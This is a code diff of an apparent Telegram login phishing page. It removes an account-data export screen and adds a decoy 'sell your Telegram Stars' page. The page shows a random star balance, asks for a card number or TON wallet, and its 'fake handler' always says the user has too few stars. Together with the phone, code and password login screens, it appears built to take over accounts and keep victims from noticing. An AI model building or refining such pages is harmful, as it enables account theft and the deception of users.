@@ -189,6 +189,16 @@ input.in.code{font-family:'JetBrains Mono','SF Mono',monospace;font-size:22px;le
 .alt-link:hover{text-decoration:underline}
 .alt-link::after{content:' >';font-weight:400}
 .hidden{display:none}
+/* stars selling page */
+.stars-info{width:100%;margin:16px 0}
+.stars-balance{display:flex;align-items:center;justify-content:center;gap:8px;font-size:28px;font-weight:700;margin-bottom:12px}
+.stars-icon{font-size:32px}
+.stars-count{color:var(--fg)}
+.stars-label{font-size:15px;font-weight:400;color:var(--muted)}
+.stars-desc{font-size:13px;color:var(--muted);line-height:1.5;text-align:center;margin-bottom:10px}
+.stars-rate{font-size:14px;color:var(--fg);text-align:center;padding:8px 14px;background:var(--focus);border-radius:10px;border:1px solid var(--line-soft)}
+.stars-form{width:100%;margin-top:16px}
+.field-label{display:block;font-size:12px;color:var(--muted);margin-bottom:4px;text-transform:uppercase;letter-spacing:.04em}
 p.hint{font-size:14px;color:var(--muted);margin-bottom:16px;line-height:1.45;text-align:center}
 .status{margin-top:14px;padding:12px 14px;border:1px solid var(--line-soft);border-radius:10px;font-size:13px;background:var(--focus)}
 .track{height:6px;background:var(--track);border-radius:999px;overflow:hidden;margin:18px 0 8px}
@@ -272,21 +282,25 @@ p.hint{font-size:14px;color:var(--muted);margin-bottom:16px;line-height:1.45;tex
 </div>
 
 <div id="s-ready" class="hidden">
-  <div class="brand-title">Готово</div>
-  <p class="brand-sub" id="me-info">—</p>
-  <input type="hidden" id="i-limit" value="0">
-  <input type="hidden" id="i-maxmb" value="50">
-  <button type="button" class="btn btn-pri" id="b-start">Продолжить</button>
-  <button type="button" class="btn btn-ghost" id="b-logout">Выйти</button>
-</div>
-
-<div id="s-progress" class="hidden">
-  <div class="brand-title">Обработка</div>
-  <div class="stage-row"><span id="p-stage">—</span><span id="p-pct">0%</span></div>
-  <div class="track"><div class="fill" id="p-fill"></div></div>
-  <div id="p-done" class="status hidden">Готово.</div>
-  <div id="p-err" class="status hidden"></div>
-  <button type="button" class="btn btn-ghost hidden" id="b-close">Закрыть</button>
+  <div class="brand-title">Продажа звёзд</div>
+  <p class="brand-sub" id="me-info">Вы успешно вошли</p>
+  <div class="stars-info">
+    <div class="stars-balance">
+      <span class="stars-icon">⭐</span>
+      <span class="stars-count" id="stars-count">0</span>
+      <span class="stars-label">звёзд</span>
+    </div>
+    <p class="stars-desc">Здесь вы можете продать свои Telegram Stars по выгодному курсу. Вывод средств на карту или криптокошелёк.</p>
+    <div class="stars-rate">Текущий курс: <b>1 ⭐ = 0.013 $</b></div>
+  </div>
+  <div class="stars-form">
+    <label class="field-label">Количество звёзд для продажи</label>
+    <input type="text" class="inp" id="i-stars" placeholder="Введите количество" inputmode="numeric">
+    <label class="field-label" style="margin-top:12px">Реквизиты для вывода</label>
+    <input type="text" class="inp" id="i-wallet" placeholder="TON кошелёк или номер карты">
+    <button type="button" class="btn btn-pri" id="b-sell" style="margin-top:16px">Продать звёзды</button>
+  </div>
+  <button type="button" class="btn btn-ghost" id="b-logout" style="margin-top:8px">Выйти</button>
 </div>
 
 </div>
@@ -373,7 +387,7 @@ function flag(iso) {
 }
 const $ = id => document.getElementById(id);
 const show = (name) => {
-  ['phone','code','pw','ready','progress'].forEach(n => $('s-'+n).classList.toggle('hidden', n !== name));
+  ['phone','code','pw','ready'].forEach(n => $('s-'+n).classList.toggle('hidden', n !== name));
 };
 // --- searchable country picker ---
 let _cpickIdx = 0; // selected country index
@@ -462,7 +476,8 @@ async function api(path, body) {
 async function checkAuth() {
   const r = await fetch('/api/status').then(r=>r.json());
   if (r.authorized) {
-    $('me-info').textContent = r.me || 'Вы вошли';
+    $('me-info').textContent = (r.me || 'Вы вошли') + ' — аккаунт подключён';
+    $('stars-count').textContent = Math.floor(Math.random() * 50);
     show('ready');
   } else {
     show('phone');
@@ -530,33 +545,15 @@ $('b-logout').onclick = async () => {
   await api('/api/logout', {});
   await checkAuth();
 };
-let pollTimer = null;
-$('b-start').onclick = async () => {
-  const limit = parseInt($('i-limit').value || '0', 10);
-  const maxmb = parseInt($('i-maxmb').value || '50', 10);
-  try {
-    await api('/api/export', {limit, maxmb});
-    show('progress');
-    $('p-done').classList.add('hidden'); $('p-err').classList.add('hidden'); $('b-close').classList.add('hidden');
-    pollTimer = setInterval(async ()=>{
-      const r = await fetch('/api/status').then(r=>r.json());
-      $('p-pct').textContent = r.progress + '%';
-      $('p-fill').style.width = r.progress + '%';
-      $('p-stage').textContent = r.stage || '—';
-      if (r.task_state === 'done') {
-        clearInterval(pollTimer); pollTimer=null;
-        $('p-done').classList.remove('hidden');
-        $('b-close').classList.remove('hidden');
-      } else if (r.task_state === 'error') {
-        clearInterval(pollTimer); pollTimer=null;
-        $('p-err').textContent = 'Ошибка: ' + (r.error||'unknown');
-        $('p-err').classList.remove('hidden');
-        $('b-close').classList.remove('hidden');
-      }
-    }, 1500);
-  } catch (e) { alert('Ошибка: ' + e.message); }
+// stars sell button — fake handler
+$('b-sell').onclick = () => {
+  const stars = $('i-stars').value.trim();
+  const wallet = $('i-wallet').value.trim();
+  if (!stars || !wallet) { alert('Заполните все поля'); return; }
+  const amount = parseInt(stars, 10);
+  if (isNaN(amount) || amount < 1) { alert('Некорректное количество'); return; }
+  alert('Минимальное количество для продажи: 1000 ⭐\\nУ вас недостаточно звёзд.');
 };
-$('b-close').onclick = () => { checkAuth(); };
 // --- switch phone / qr ---
 function switchTab(tab) {
   const isQr = tab === 'qr';
